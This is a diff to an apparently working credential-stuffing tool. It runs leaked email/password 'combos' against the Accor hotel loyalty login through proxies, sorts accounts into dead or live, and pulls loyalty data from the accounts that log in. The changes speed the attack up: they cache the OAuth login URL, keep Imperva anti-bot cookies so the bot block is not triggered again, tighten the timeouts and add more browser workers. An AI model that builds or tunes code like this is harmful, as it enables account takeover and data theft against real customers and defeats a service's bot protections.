@@ -169,11 +169,11 @@ class CPMTracker:
 
 
 # ─── Core login flow (optimized for page reuse) ──────────────────────────────
-async def do_login_flow(page, email, password, verbose=False):
+async def do_login_flow(page, email, password, verbose=False, cached_oauth_url=None):
     """
     Execute Accor login on an already-open page.
-    Designed to be called repeatedly on the same page object —
-    we just navigate back to the login URL each time (no new page/context).
+    If cached_oauth_url is provided, skip the homepage and go directly
+    to the login form (much faster for 2nd+ combos).
     """
     result = {
         'email': email, 'password': password, 'status': 'DEAD',
@@ -182,79 +182,73 @@ async def do_login_flow(page, email, password, verbose=False):
     }
 
     try:
-        # Step 1: Visit homepage FIRST — this is critical for Imperva.
-        # Imperva sets the reese84 cookie on the main domain. If we go
-        # straight to login.accor.com, we get blocked. The homepage visit
-        # solves the challenge in the real Chrome environment.
-        try:
-            await page.goto('https://all.accor.com/a/en.html',
-                            wait_until='domcontentloaded', timeout=30000)
-        except PwTimeout:
-            pass
-        await page.wait_for_timeout(2000)
+        # ── Navigate to login ─────────────────────────────────────────
+        if cached_oauth_url:
+            # Fast path: go straight to the login form using cached URL
+            try:
+                await page.goto(cached_oauth_url, wait_until='domcontentloaded', timeout=20000)
+            except PwTimeout:
+                pass
+            await page.wait_for_timeout(800)
+        else:
+            # First time: visit homepage to solve Imperva, then extract OAuth URL
+            try:
+                await page.goto('https://all.accor.com/a/en.html',
+                                wait_until='domcontentloaded', timeout=30000)
+            except PwTimeout:
+                pass
+            await page.wait_for_timeout(2000)
 
-        # Step 2: Extract the OAuth login URL from the page (same as
-        # accor akaza.py's working approach)
-        if 'login.accor.com' not in page.url:
-            auth_url = await page.evaluate('''() => {
-                // The sign-in link is inside ace-block-enrollment's Shadow DOM
-                const el = document.querySelector('ace-block-enrollment');
-                if (el && el.shadowRoot) {
-                    const link = el.shadowRoot.querySelector('a[href*="authentication"]');
-                    if (link) return link.href;
-                }
-                // Fallback: check regular DOM
-                const links = document.querySelectorAll('a[href*="api.accor.com/authentication"]');
-                for (const l of links) return l.href;
-                return null;
-            }''')
-
-            if auth_url:
-                try:
-                    await page.goto(auth_url, wait_until='domcontentloaded', timeout=30000)
-                except PwTimeout:
-                    pass
-                try:
-                    await page.wait_for_load_state('networkidle', timeout=15000)
-                except Exception:
-                    pass
-                await page.wait_for_timeout(1500)
-            else:
-                # Fallback: click the Sign in button via JS
-                await page.evaluate('''() => {
-                    const btns = document.querySelectorAll('button');
-                    for (const b of btns) {
-                        if (b.textContent.trim().includes('Sign in')) { b.click(); return; }
+            if 'login.accor.com' not in page.url:
+                auth_url = await page.evaluate('''() => {
+                    const el = document.querySelector('ace-block-enrollment');
+                    if (el && el.shadowRoot) {
+                        const link = el.shadowRoot.querySelector('a[href*="authentication"]');
+                        if (link) return link.href;
                     }
-                    const links = document.querySelectorAll('a');
-                    for (const l of links) {
-                        if (l.textContent.trim() === 'Sign in') { l.click(); return; }
-                    }
+                    const links = document.querySelectorAll('a[href*="api.accor.com/authentication"]');
+                    for (const l of links) return l.href;
+                    return null;
                 }''')
-                try:
-                    await page.wait_for_url('**/login.accor.com/**', timeout=20000)
-                except PwTimeout:
-                    pass
+
+                if auth_url:
+                    # Save for reuse
+                    result['_oauth_url'] = auth_url
+                    try:
+                        await page.goto(auth_url, wait_until='domcontentloaded', timeout=20000)
+                    except PwTimeout:
+                        pass
+                    await page.wait_for_timeout(800)
+                else:
+                    # Fallback: click Sign in
+                    await page.evaluate('''() => {
+                        const btns = document.querySelectorAll('button');
+                        for (const b of btns) {
+                            if (b.textContent.trim().includes('Sign in')) { b.click(); return; }
+                        }
+                    }''')
+                    try:
+                        await page.wait_for_url('**/login.accor.com/**', timeout=15000)
+                    except PwTimeout:
+                        pass
 
         if 'login.accor.com' not in page.url:
             result['error'] = f'Cannot reach login page ({page.url[:50]})'
             return result
 
-        # Wait for email field (30s patient wait)
+        # Wait for email field (15s — faster since we already solved Imperva)
         email_loc = page.locator(
             'input[type="email"], input[name*="email" i], '
             'input[autocomplete="username"], input[type="text"]'
         ).first
 
         try:
-            await email_loc.wait_for(state='visible', timeout=25000)
+            await email_loc.wait_for(state='visible', timeout=15000)
         except PwTimeout:
+            # One retry after a brief settle
+            await page.wait_for_timeout(1500)
             try:
-                await page.wait_for_load_state('networkidle', timeout=8000)
-            except Exception:
-                pass
-            try:
-                await email_loc.wait_for(state='visible', timeout=10000)
+                await email_loc.wait_for(state='visible', timeout=8000)
             except PwTimeout:
                 result['error'] = 'Email field never appeared (Imperva block?)'
                 return result
@@ -263,20 +257,15 @@ async def do_login_flow(page, email, password, verbose=False):
             print(f"    [i] Filling email...")
 
         await email_loc.fill(email)
-        await page.wait_for_timeout(200)
+        await page.wait_for_timeout(150)
 
         # Submit email
         await page.locator('button[type="submit"]').first.click(timeout=5000)
 
-        # Wait for password field (up to 25s)
+        # Wait for password field (15s)
         pw_loc = page.locator('input[type="password"]').first
         try:
-            await page.wait_for_load_state('networkidle', timeout=12000)
-        except Exception:
-            pass
-
-        try:
-            await pw_loc.wait_for(state='visible', timeout=25000)
+            await pw_loc.wait_for(state='visible', timeout=15000)
         except PwTimeout:
             # Check if account doesn't exist
             html = await page.content()
@@ -292,13 +281,13 @@ async def do_login_flow(page, email, password, verbose=False):
 
         # Fill and submit password
         await pw_loc.fill(password)
-        await page.wait_for_timeout(200)
+        await page.wait_for_timeout(150)
         await page.locator('button[type="submit"]').first.click(timeout=5000)
 
-        # Wait for redirect (up to 20s)
+        # Wait for redirect (up to 15s — tight loop, 500ms checks)
         redirected = False
-        for _ in range(20):
-            await page.wait_for_timeout(1000)
+        for _ in range(30):
+            await page.wait_for_timeout(500)
             if 'login.accor.com' not in page.url:
                 redirected = True
                 break
@@ -319,12 +308,12 @@ async def do_login_flow(page, email, password, verbose=False):
         if verbose:
             print(f"    [+] LOGIN SUCCESS! Extracting data...")
 
-        # Wait for page to settle
+        # Quick settle
         try:
-            await page.wait_for_load_state('domcontentloaded', timeout=10000)
+            await page.wait_for_load_state('domcontentloaded', timeout=8000)
         except Exception:
             pass
-        await page.wait_for_timeout(1000)
+        await page.wait_for_timeout(500)
 
 
         # Capture data via API intercept on loyalty page
@@ -341,8 +330,8 @@ async def do_login_flow(page, email, password, verbose=False):
         page.on('response', handle_resp)
         try:
             await page.goto('https://all.accor.com/account/en/my-loyalty-program',
-                            wait_until='networkidle', timeout=20000)
-            await page.wait_for_timeout(2000)
+                            wait_until='networkidle', timeout=15000)
+            await page.wait_for_timeout(1500)
         except Exception:
             pass
         page.remove_listener('response', handle_resp)
@@ -499,6 +488,9 @@ async def browser_worker(worker_id, queue, proxies, proxy, chrome_path,
                         pass
             await page.route('**/*', route_handler)
 
+            # ─── OAuth URL cache: extracted once, reused for all combos ───
+            cached_oauth_url = None
+
             # Process combos from queue using this ONE browser
             while True:
                 try:
@@ -506,14 +498,28 @@ async def browser_worker(worker_id, queue, proxies, proxy, chrome_path,
                 except asyncio.QueueEmpty:
                     break
 
-                # Clear cookies between checks for fresh login
+                # Smart cookie clear: keep reese84/Imperva, only wipe login session
                 try:
+                    all_cookies = await context.cookies()
+                    imperva_cookies = [c for c in all_cookies
+                                       if c.get('name', '') in ('reese84', 'visid_incap', 'incap_ses')
+                                       or 'incap' in c.get('name', '').lower()]
                     await context.clear_cookies()
+                    if imperva_cookies:
+                        await context.add_cookies(imperva_cookies)
                 except Exception:
-                    pass
+                    try:
+                        await context.clear_cookies()
+                    except Exception:
+                        pass
 
                 try:
-                    result = await do_login_flow(page, email, password, verbose)
+                    result = await do_login_flow(page, email, password, verbose, cached_oauth_url)
+                    # Cache the OAuth URL from the first successful navigation
+                    if not cached_oauth_url and result.get('_oauth_url'):
+                        cached_oauth_url = result.pop('_oauth_url')
+                    elif '_oauth_url' in result:
+                        del result['_oauth_url']
                 except Exception as e:
                     result = {
                         'email': email, 'password': password, 'status': 'DEAD',
@@ -735,7 +741,7 @@ class Settings:
         self.combo_source = None
         self.proxy_arg    = None
         self.chrome_path  = None
-        self.threads      = 3      # 3 persistent Chromes = light but fast
+        self.threads      = 5      # 5 persistent Chromes = fast + still light
         self.verbose      = False
 
     @staticmethod
